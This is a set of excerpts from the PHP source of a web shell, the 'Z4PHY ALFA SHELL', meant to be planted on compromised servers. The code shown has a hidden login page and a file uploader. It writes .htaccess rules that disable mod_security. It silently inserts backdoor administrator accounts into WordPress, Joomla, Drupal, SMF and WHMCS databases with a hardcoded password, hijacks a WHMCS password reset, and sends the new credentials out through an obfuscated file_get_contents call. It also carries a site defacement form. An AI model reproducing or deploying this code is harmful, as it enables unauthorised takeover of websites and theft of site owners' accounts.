...
define("__ALFA_DATA_FOLDER__", "DATA_Z4PHY");
...
<title>$ .:Z4P ALFA'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.':. $</title><center>
<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="https://raw.githubusercontent.com/z4phyr/Z4PHY-PHANT0MHIVE/main/z4p-b3p4s/asset/icons.jpg" /></center>
<div id=loginbox><p><font face="verdana,arial" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>.:Z4PHY ALFA SHELL:.</b></font></th></tr>
...
}elseif($config['AlfaLoginPage']=='z4phy'){
if(@$_COOKIE["AlfaPass"] != @md5($config['AlfaPass'])){
if(@md5($_POST["password"])==$config['AlfaPass']){
__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
__alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
...
<head>
    ...
    <meta name="description" content="$ .:Z4PHY ALFA LOGIN:. $" />
    <meta name="robots" content="noindex, nofollow" />
    <meta name="googlebot" content="noindex, nofollow" />
    <meta name="bingbot" content="noindex, nofollow" />
    <link href="https://raw.githubusercontent.com/z4phyr/Z4PHY-PHANT0MHIVE/main/z4p-b3p4s/asset/ciel.png" rel="shortcut icon" type="image/x-icon">
    <link rel="apple-touch-icon" href="https://raw.githubusercontent.com/z4phyr/Z4PHY-PHANT0MHIVE/main/z4p-b3p4s/asset/ciel.png"/>
...
<title>..:: '.$_SERVER['HTTP_HOST'].' ~ Z4PHY ALFA SHELL ::..</title>
<style type="text/css">';?>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="https://raw.githubusercontent.com/z4phyr/Z4PHY-PHANT0MHIVE/main/z4p-b3p4s/asset/icons.jpg" /></td>
</tr>
<tr>
...
$create = "insert into tblclients (email) values('z4phy@proton.me')";
...
$AlfaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=z4phy@proton.me");
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ Z4PHY ALFA SHELL &copy; 2012-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: bc1q9pq38fg09kenj0fqmamhl6fxeemw60j7uh5jax\");' style='color: #E91E63;text-decoration: none;'>Donate Us !</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>z4phy@proton.me</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://t.me/zaynphantomhive'>Z4PHY</a></span></div></td>
</tr>
</table>
</div>
...
<title>Sweet touch by Z4phy</title><textarea name=index rows='19' cols='103'><b>Sweet touch by Z4phy</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['alfa6'])){
$s0levisible="Powered By Z4phy";
$dbu = $_POST['alfa6'];
$path = $_POST['alfa5'];
$fname = $_POST['alfa4'];
$dbn = $_POST['alfa7'];
...
@__write_file($GLOBALS['cwd'].".htaccess","#Generated By Z4phy<IfModule mod_security.c>\nSec------Engine Off\nSec------ScanPOST Off\n</IfModule>");
...
@__write_file($GLOBALS['cwd'].".htaccess","#Generated By Z4phy\n<Files *.php>\nForceType application/x-httpd-php4\n</Files>\n<IfModule mod_security.c>\nSecFilterEngine Off\nSecFilterScanPOST Off\n</IfModule>");
...
$table = array('td1' =>
 ...
 'td6' =>
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'z4physec', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'kh', 'inputValue' => '!@!Z4phySec1337!@!', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'z4phy@proton.me', 'inputSize' => '50')
);
create_table($table);
...
$SQL = $_POST['alfa9'];
$prefix = $_POST['alfa10'];
$wpSuccess = "NEW WP ADMIN%0A%0ALogin: ".$_SERVER['SERVER_NAME']."/wp-login.php%0AUsername: ".$admin."%0APassword: !@!Z4phySec1337!@!";
...
$f_get("".$wpSuccess);
...
$table = array('td1' =>
 ...
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'z4physec', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => '!@!Z4phySec1337!@!', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'z4phy@proton.me', 'inputSize' => '50')
);
create_table($table);
...
$SQL = $_POST['alfa9'];
$prefix = $_POST['alfa10'];
$jomSuccess = "NEW JOOMLA ADMIN%0A%0ALogin: ".$_SERVER['SERVER_NAME']."/administrator/%0AUsername: ".$admin."%0APassword: !@!Z4phySec1337!@!";
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
...
if($solevisible){
$f_get = 'f'.'il'.'e'.'_'.'ge'.'t'.'_'.'c'.'on'.'te'.'nt';
$f_get("".$jomSuccess);
__alert('Success... '.$admin.' is created...');}
}
}
...
$solevisible=@mysqli_query($conn,"insert into users (uid,name,pass,mail,signature_format,status,timezone,init) values('$getDescuid','$admin','\$S\$DP2y9AbolCBOd\/WyQcpzu4zF57qE0noyCNeXZWv.37R66VsFjOiC','z4phy@proton.me','filtered_html','1','Europe/Berlin','z4phy@proton.me')") or die(mysqli_error($conn));
...
$solevisible=@mysqli_query($conn,"insert into {$prefix}members (id_member,member_name,id_group,real_name,passwd,email_address) values(null,'$admin','1','$admin','$setpwAlg','z4phy@proton.me')") or die(mysqli_error($conn));
if($solevisible){
__alert('Success... '.$admin.' is created...');}
}
}
